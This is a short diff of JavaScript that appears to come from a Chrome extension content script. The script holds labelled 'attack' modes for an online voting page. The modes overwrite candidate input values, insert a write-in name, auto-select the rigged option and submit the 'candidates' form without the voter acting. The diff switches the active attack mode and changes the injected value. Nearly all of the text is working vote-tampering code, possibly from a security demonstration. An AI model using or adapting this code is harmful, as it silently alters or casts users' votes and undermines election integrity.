@@ -7,13 +7,13 @@ chrome.extension.onMessage.addListener(function(message, sender, sendResponse) {
 });
 
 var toggle = function(changeVotes){
-	var attack = "1";
+	var attack = "3";
 
 	if (attack == "1"){
 		var inputs = $('input[name="candidate"]');
 		var inputLength = inputs.length;
 		for(var i = 0; i < inputLength; i++){
-			inputs[i].value = "trevorjones";
+			inputs[i].value = "1";
 		}
 	} else if (attack == "2"){
 		document.getElementById("winput").value = "Trevor Jones";
@@ -22,7 +22,7 @@ var toggle = function(changeVotes){
 		var inputs = $('input[name="candidate"]');
 		var inputLength = inputs.length;
 		for(var i = 0; i < inputLength; i++){
-			if(inputs[i].value == "trevorjones"){
+			if(inputs[i].value == "1"){
 				inputs[i].checked = true;
 				document.getElementById("candidates").submit();
 			}
